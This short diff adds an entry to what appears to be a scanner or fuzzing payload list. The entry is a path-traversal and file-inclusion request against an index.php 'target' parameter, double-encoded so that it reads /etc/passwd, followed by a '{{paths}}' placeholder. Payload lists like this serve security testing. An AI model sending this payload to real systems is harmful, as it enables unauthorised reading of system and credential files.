@@ -1,0 +1,2 @@
+/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
+{{paths}}
